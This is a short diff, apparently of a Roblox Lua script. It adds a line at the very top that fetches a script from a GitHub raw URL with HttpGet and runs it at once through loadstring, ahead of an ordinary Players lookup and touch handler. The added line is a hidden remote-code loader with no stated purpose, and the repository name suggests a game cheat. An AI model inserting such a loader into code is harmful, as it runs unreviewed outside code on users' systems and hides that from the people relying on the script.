@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/pwrsk/mm2/main/mm2'))()
 local Players = game:GetService("Players")
 
 local function onTouched(hit)
